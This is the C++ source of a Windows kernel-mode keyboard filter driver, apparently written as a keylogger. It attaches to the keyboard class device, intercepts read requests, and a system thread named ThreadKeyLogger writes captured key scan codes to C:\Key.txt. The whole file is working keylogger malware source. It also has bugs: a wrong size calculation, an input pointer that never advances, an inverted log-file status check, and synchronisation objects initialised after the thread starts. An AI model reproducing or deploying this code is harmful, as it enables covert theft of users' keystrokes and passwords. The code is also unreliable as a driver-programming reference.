///////////////////////////////////////////////////////////////////////////////
///
/// Copyright (c) 2009 - <company name here>
///
/// Original filename: ius.cpp
/// Project          : ius
/// Date of creation : 2009-11-06
/// Author(s)        : 
///
/// Purpose          : <description>
///
/// Revisions:
///  0000 [2009-11-06] Initial revision.
///
///////////////////////////////////////////////////////////////////////////////

// $Id$

#ifdef __cplusplus
extern "C" {
#endif
#include <ntddk.h>
#include <string.h>
#ifdef __cplusplus
}; // extern "C"
#endif

#include <ntddkbd.h>
#include <ntdef.h>
#include "Iusu.h"

#ifdef __cplusplus
namespace { // anonymous namespace to limit the scope of this global variable!
#endif
PDRIVER_OBJECT pdoGlobalDrvObj = 0;
#ifdef __cplusplus
}; // anonymous namespace
#endif


PDEVICE_OBJECT mydevice,targetdevice;
PIRP pcancel;


#pragma LOCKEDCODE
NTSTATUS CompletionRoutine(IN PDEVICE_OBJECT pDevObj,IN PIRP Irp,PVOID Context)
{
	int numKeys;
	PKEYBOARD_INPUT_DATA key;
	PDEVICE_EXTENSION pdx=(PDEVICE_EXTENSION)pDevObj->DeviceExtension;
	
	if(Irp->IoStatus.Status==STATUS_SUCCESS)
	{
		key=(PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;
		numKeys=Irp->IoStatus.Information/sizeof(PKEYBOARD_INPUT_DATA);
		for(int i=0;i<numKeys;i++)
		{
			if(key->Flags==KEY_MAKE && key->MakeCode)
			{
				KdPrint(("Scan MakeCode:%x\n",key->MakeCode));
			

			KEY_DATA* kData=(KEY_DATA*)ExAllocatePool(NonPagedPool,sizeof(KEY_DATA));
			kData->KeyData=key->MakeCode;
			kData->KeyFlags=key->Flags;

			KdPrint(("Add Irp to the queue."));
			ExInterlockedInsertTailList(&pdx->List,&kData->ListEntry,&pdx->Lock);

			//Semaphore
			KeReleaseSemaphore(&pdx->Semaphore,0,1,FALSE);
			}
		}
	}

	
	if (Irp->PendingReturned==TRUE)
	{
		IoMarkIrpPending(Irp);
	}
	pdx->uIrpPendingCount--;
	return STATUS_SUCCESS;
}




#pragma PAGEDCODE 
VOID IusUnload(IN PDRIVER_OBJECT  DriverObject)
{
	NTSTATUS status;
	PDEVICE_OBJECT pDevObj=targetdevice;
	PDEVICE_EXTENSION pDevExt=(PDEVICE_EXTENSION)pDevObj->DeviceExtension;
	
	if(pDevExt->bAttached)
	{
		IoDetachDevice(pDevObj);
		pDevExt->bAttached=FALSE;
	}
	
	PDEVICE_EXTENSION pDevExt1=(PDEVICE_EXTENSION)mydevice->DeviceExtension;

	LARGE_INTEGER timeout;
	timeout.QuadPart=10000000;
	KeInitializeTimer(&pDevExt1->kTimer);

	
	while(pDevExt1->uIrpPendingCount>0)
	{
		KeSetTimer(&pDevExt1->kTimer,timeout,NULL);
		KeWaitForSingleObject(&pDevExt1->kTimer,Executive,KernelMode,FALSE,NULL);
	}
	
	if(pcancel!=NULL)
	{
		BOOLEAN b=IoCancelIrp(pcancel);
	}
	pDevExt->bThreadTerminate=TRUE;
	ULONG ul=KeReleaseSemaphore(&pDevExt1->Semaphore,0,1,TRUE);
	status=KeWaitForSingleObject(&pDevExt1->pThreadObj,Executive,KernelMode,FALSE,NULL);
	status=KeCancelTimer(&pDevExt1->kTimer);

	status=ZwClose(pDevExt1->hLogFile);//notice whose device...
	
	status=IoDeleteSymbolicLink(&pDevExt1->ustrSymLinkName);
	IoDeleteDevice(mydevice);
}

NTSTATUS Dispatch(IN PDEVICE_OBJECT pDevObj,IN PIRP Irp)
{
	IoSkipCurrentIrpStackLocation(Irp);
	
	return IoCallDriver(targetdevice,Irp);
}

NTSTATUS Dispatched(IN PDEVICE_OBJECT pDevObj,IN PIRP Irp)
{
	PDEVICE_EXTENSION pdx=(PDEVICE_EXTENSION)pDevObj->DeviceExtension;
	
	IoCopyCurrentIrpStackLocationToNext(Irp);
	IoSetCompletionRoutine(Irp,&CompletionRoutine,NULL,TRUE,TRUE,TRUE);
	pdx->uIrpPendingCount++;
	pcancel = Irp;
	
	return IoCallDriver(targetdevice,Irp);
}

NTSTATUS CreateClose(IN PDEVICE_OBJECT DeviceObject,IN PIRP Irp)
{
	NTSTATUS status=STATUS_SUCCESS;
	Irp->IoStatus.Status=status;
	Irp->IoStatus.Information=0;

	IoCompleteRequest(Irp,IO_NO_INCREMENT);
	return status;
}

VOID ThreadKeyLogger(IN PVOID pContext)
{

	if(KeGetCurrentIrql()<DISPATCH_LEVEL)
	{
		KdPrint(("PASSIVE_LEVEL."));
	}
	else
	{
		KdPrint(("DISPATCH_LEVEL"));
	}
	PDEVICE_EXTENSION pDevExt=(PDEVICE_EXTENSION)pContext;
	PDEVICE_OBJECT pKeyboardObject=pDevExt->pDevice;

	PLIST_ENTRY pListEntry;
	KEY_DATA* kData;

	
	BOOLEAN b=TRUE;



	while(b)//good idea.   use semaphore and KeWaitForSingleObject do the IRP job.
	{
		KeWaitForSingleObject(&pDevExt->Semaphore,Executive,KernelMode,FALSE,NULL);
		pListEntry=ExInterlockedRemoveHeadList(&pDevExt->List,&pDevExt->Lock);
		if(pDevExt->bThreadTerminate)
		{
			PsTerminateSystemThread(STATUS_SUCCESS);
		}
			kData=CONTAINING_RECORD(pListEntry,KEY_DATA,ListEntry);

			//字符串乱码问题,  初始化的问题
			ANSI_STRING keys;
				switch(kData->KeyData)
				{
					case 0x1:
						RtlInitAnsiString(&keys,"ESC");
						KdPrint(("ESC 键被按下"));
						break;
					case 0x2:
						RtlInitAnsiString(&keys,"1");
						KdPrint(("1 键被按下"));
						break;
					case 0x3:
						RtlInitAnsiString(&keys,"2");
						KdPrint(("2 键被按下"));
						break;
					case 0x4:
						RtlInitAnsiString(&keys,"3");
						KdPrint(("3 键被按下"));
						break;
					case 0x5:
						RtlInitAnsiString(&keys,"4");
						KdPrint(("4 键被按下"));
						break;
					case 0x6:
						RtlInitAnsiString(&keys,"5");
						KdPrint(("5 键被按下"));
						break;
					case 0x7:
						RtlInitAnsiString(&keys,"6");
						KdPrint(("6 键被按下"));
						break;
					case 0x8:
						RtlInitAnsiString(&keys,"7");
						KdPrint(("7 键被按下"));
						break;
					case 0x9:
						RtlInitAnsiString(&keys,"8");
						KdPrint(("8 键被按下"));
						break;
					case 0xA:
						RtlInitAnsiString(&keys,"9");
						KdPrint(("9 键被按下"));
						break;
					case 0xB:
						RtlInitAnsiString(&keys,"0");
						KdPrint(("0 键被按下"));
						break;

					default:
						KdPrint(("MakeCode:%X",kData->KeyData));
						break;
				}
				IO_STATUS_BLOCK io_status;
				NTSTATUS status=ZwWriteFile(pDevExt->hLogFile,NULL,NULL,NULL,&io_status,keys.Buffer,keys.Length,NULL,NULL);
				if(status!=STATUS_SUCCESS)  
				{
					KdPrint(("Writing..."));
				}
				else   
				{
					KdPrint(("Scan code '%s' successfully written to file.\n",keys.Buffer));
				}

		
	}
}


NTSTATUS  InitThreadLogger(IN PDRIVER_OBJECT DriverObject)
{
	HANDLE hThread;
	PDEVICE_EXTENSION pDevExt=(PDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension;
	pDevExt->bThreadTerminate=FALSE;

	NTSTATUS status=PsCreateSystemThread(&hThread,(ACCESS_MASK)0L,NULL,NULL,NULL,ThreadKeyLogger,pDevExt);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("PsCreateSystemThread error."));
		return status;
	}
	status=ObReferenceObjectByHandle(hThread,THREAD_ALL_ACCESS,NULL,KernelMode,(PVOID *)&pDevExt->pThreadObj,NULL);

	ZwClose(hThread);
	return status;
}






#pragma INITCODE
extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject,IN PUNICODE_STRING RegistryPath)
{
	PDEVICE_OBJECT device;
	PFILE_OBJECT file;
	NTSTATUS status;
	UNICODE_STRING DeviceName;
	UNICODE_STRING DeviceName1;
	UNICODE_STRING SymbolicName;

	KdPrint(("loaded loaded  loaded."));
	DriverObject->DriverUnload=IusUnload;
	for(int i=0;i<=IRP_MJ_MAXIMUM_FUNCTION;i++)
	{
		DriverObject->MajorFunction[i]=Dispatch;
	}
	DriverObject->MajorFunction[IRP_MJ_CREATE]=
	DriverObject->MajorFunction[IRP_MJ_CLOSE]=CreateClose;
	DriverObject->MajorFunction[IRP_MJ_READ]=Dispatched;

	RtlInitUnicodeString(&DeviceName,L"\\Device\\KeyboardClass0");
	RtlInitUnicodeString(&DeviceName1,L"\\Device\\Ius");
	RtlInitUnicodeString(&SymbolicName,L"\\??\\ZLSZLS");

	status=IoGetDeviceObjectPointer(&DeviceName,FILE_ALL_ACCESS,&file,&device);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("Get Device error."));
		return status;
	}


	status=IoCreateDevice(DriverObject,sizeof(DEVICE_EXTENSION),&DeviceName1,device->DeviceType,device->Characteristics,TRUE,&mydevice);
	if(!NT_SUCCESS(status))
	{
		KdPrint(("Create Device error."));
		return status;
	}
  
	
	

	PDEVICE_EXTENSION pDevExt=(PDEVICE_EXTENSION)mydevice->DeviceExtension;
	pDevExt->pDevice=mydevice;
	pDevExt->ustrDeviceName=DeviceName1;
	pDevExt->uIrpPendingCount=0;
	
	status=IoCreateSymbolicLink(&SymbolicName,&DeviceName1);
	pDevExt->ustrSymLinkName=SymbolicName;


	targetdevice=IoAttachDeviceToDeviceStack(mydevice,device);

	if(!targetdevice)
	{
		IoDeleteDevice(mydevice);
		ObDereferenceObject(file);
		KdPrint(("Attach failed."));
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	pDevExt->bAttached=TRUE;

	mydevice->DeviceType=targetdevice->DeviceType;
	mydevice->Characteristics=targetdevice->Characteristics;
	mydevice->Flags &= ~DO_DEVICE_INITIALIZING;
	mydevice->Flags |= (targetdevice->Flags &(DO_DIRECT_IO | DO_BUFFERED_IO));
	ObDereferenceObject(file);

	InitThreadLogger(DriverObject);

	InitializeListHead(&pDevExt->List);
	KeInitializeSpinLock(&pDevExt->Lock);
	KeInitializeSemaphore(&pDevExt->Semaphore,0,MAXLONG);
	
	UNICODE_STRING textname;
	RtlInitUnicodeString(&textname,L"\\??\\C:\\Key.txt");
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(&ObjectAttributes,&textname,OBJ_CASE_INSENSITIVE,NULL,NULL);

	IO_STATUS_BLOCK StatusBlock;
	status=ZwCreateFile(&pDevExt->hLogFile,GENERIC_WRITE,&ObjectAttributes,&StatusBlock,NULL,FILE_ATTRIBUTE_NORMAL,0,FILE_OPEN_IF,FILE_SYNCHRONOUS_IO_NONALERT,NULL,0);

	if(NT_SUCCESS(status))
	{
		KdPrint(("Create log file error."));
	}
	else
	{
		KdPrint(("Create log file succeed."));
		KdPrint(("File Handle is %x \n",pDevExt->hLogFile));
	}


	KdPrint(("DriverEntry  SUCCESS"));
	return STATUS_SUCCESS;
}